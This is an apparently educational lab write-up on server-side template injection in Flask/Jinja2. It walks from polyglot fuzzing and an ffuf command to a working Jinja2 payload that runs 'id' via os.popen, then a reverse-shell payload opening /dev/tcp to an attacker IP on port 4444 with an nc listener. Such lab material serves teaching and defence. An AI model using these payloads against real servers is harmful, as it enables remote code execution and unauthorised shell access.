# SSTI Audition Lab

## Welcome!

In this lab, we will look at Server-side Template Injection, a web vulnerability common among many web frameworks that use templates. Please feel free to step outside of the instructions and play around with the injection and the various features you can abuse with it.

Template engines are designed to help frameworks generate web pages by combining fixed templates with input data. Server-side template injection occurs when a template renders in a web application without filtering, allowing us, the attacker, to execute arbitrary code on the server. In this lab, we will look at the Jinja2 framework in Python and how to abuse SSTI to gain a reverse shell against the web server.

## Discovery

![img8.PNG](img8.PNG)

Heading to Tech Guru's website, we can find a field requesting our name for personalized insights. Because this field is a prime candidate for server-side template injection, let's go ahead and try to fuzz for it. The most straightforward approach would be using a polyglot to see how the application interacts with our request.

```python
${{<%[%'"}}%\
```

![img.png](img.png)

Polyglots are great because they test all characters that could make an application vulnerable. What we are looking for here is to trigger an unexpected error or behavior.

After clicking "Get Insights," we will execute the polyglot and receive a flask error. Excellent! Now we know precisely what template the application is using.

![img1.png](img1.png)

In this case, we now know that the application we are interacting with is written in Python. We also understand that its template is Jinja2, as annotated by the `jinja2.exceptions.TemplateSyntaxError`.

In other applications outside this lab, if the above did not result in an error or some other indicator that the application behaved unexpectedly. We may use the `ffuf` tool to fuzz instead. After we have opened burp suite (You may type burp suite in the console), we may run the following:

```bash
#The wget command is just to grab the fuzzing file we will be using, it contains code for all templates.
wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz
ffuf -u www.victim-website.com/ -x FUZZ -w ssti.fuzz -replay-proxy http://127.0.0.1:8080/
```

You may manually analyze the responses to see what returns "49" (As indicated by 7*7) or the id of the user.

2 great resources for figuring out which template injection it is are the following:

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Since we do not need to use ffuf as we already know the template. We can look into specifics on how the Jinja2 template works.
## Understanding the Jinja2 Template
https://jinja.palletsprojects.com/en/3.1.x/

"Jinja is a fast, expressive, extensible templating engine. Special placeholders in the template allow writing code similar to Python syntax. Then the template is passed data to render the final document."

Jinja2 is typically used in the django and flask frameworks. 

If the app blindly takes user input and renders it in the application, it may be vulnerable to arbitrary code injection. Let's take a look at what this looks like in Python.

```python
greeting = render_template_string(f"Hello, {name}!")
```

The `render_template_string` function renders the template {name} without filtering. Because of this, we can make the application evaluate any code we provide.

## Discovery of Python Methods with SSTI (Flask / Jinja2)

Some template frameworks allow you to execute arbitrary code freely; Jinja2, however, does not. We must first figure out what methods we can access.

Firstly, we will attempt to access a simple built-in method such as `upper()`

`{{"test".upper()}}`

![img2.PNG](img2.png)

We can see that "test" is in all-caps. Knowing that we can now access built-in methods, we can leverage this to execute any code from any module that is built into python.

The `os` module in python allows python to interface with the operating system. This is a prime target for us as it will enable us to execute code directly on the target host.

There are several ways to access a built-in method; however, we will use something simple and obtain remote code execution that way. You will always want to start simple and ensure you can get a working proof of concept exploit before expanding on it into something more complicated like a reverse shell. For now, we will obtain the user's id the flask application is running as.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![img3.png](img3.png)

Great! As you can see, we can successfully execute Linux commands. Now let's get a reverse shell!

We will configure our command first to copy over into our SSTI Injection.

```bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/4444 0>&1"
```

You will want to change the IP address `x.x.x.x`. You may get your IP address by typing `ip addr`.

After you have configured your SSTI Injection, we will want to create the full PoC (Proof of Concept) in a note to copy and paste.

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.112/4444 0>&1"').read() }}```
```

Now that we have built our payload, we may start a listener on our attack machine.

```bash
nc -nvlp 4444
```

![img6.png](img6.png)

After you execute the payload on the website, you should obtain a shell from the web server.

![img5.png](img5.png)

![img7.png](img7.png)

Excellent, we now have a reverse shell on the web server!